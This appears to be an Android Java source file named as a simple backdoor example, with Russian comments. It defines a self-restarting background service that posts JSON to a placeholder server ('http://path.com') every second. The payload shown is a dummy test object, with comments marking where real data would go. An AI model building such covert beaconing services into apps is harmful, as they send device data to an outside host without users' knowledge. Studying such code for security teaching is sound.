package ru.security.simplebackdoorexample;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.concurrent.TimeUnit;
import java.util.function.LongFunction;

import okhttp3.RequestBody;

import okhttp3.ResponseBody;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.adapter.rxjava.RxJavaCallAdapterFactory;
import retrofit2.converter.gson.GsonConverterFactory;
import rx.Observable;
import rx.Subscriber;
import rx.android.schedulers.AndroidSchedulers;
import rx.functions.Func1;
import rx.schedulers.Schedulers;
import rx.schedulers.TimeInterval;

public class BackdoorService extends Service {

    // Тут указываем путь к серверу
    private static final String PATH = "http://path.com";

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();

        Retrofit retrofit = new Retrofit.Builder()
                .addCallAdapterFactory(RxJavaCallAdapterFactory.create())
                .addConverterFactory(GsonConverterFactory.create())
                .baseUrl(PATH)
                .build();


        Api service = retrofit.create(Api.class);

        // Отправляем каждую секунду
        Observable<Response<ResponseBody>> request = Observable.interval(1000L, TimeUnit.MILLISECONDS)
                .timeInterval()
                .flatMap(new Func1<TimeInterval<Long>, Observable<Response<ResponseBody>>>() {
                    @Override
                    public Observable<Response<ResponseBody>> call(TimeInterval<Long> longTimeInterval) {
                        try {
                            // Тут мы создаем нужный JSON
                            JSONObject jsonObject = new JSONObject().put("test", "test");
                            Log.v("TestJSON",  "JSON " + jsonObject.toString() + " sent to " + PATH);
                            return service.postData(jsonObject);
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                        return null;
                    }
                });

        request.observeOn(Schedulers.newThread())
                .subscribeOn(AndroidSchedulers.mainThread())
                .subscribe(new Subscriber<Response<ResponseBody>>() {
                    @Override
                    public void onCompleted() {

                    }

                    @Override
                    public void onError(Throwable e) {

                    }

                    @Override
                    public void onNext(Response<ResponseBody> requestBodyResponse) {
                        // Тут можно проверить, как выполнился запрос
                        Log.v("RESULT CODE", requestBodyResponse.code()+"");
                    }
                });

    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Сервис пересоздается каждый раз, когда уничтожается.
        return START_STICKY;
    }
}
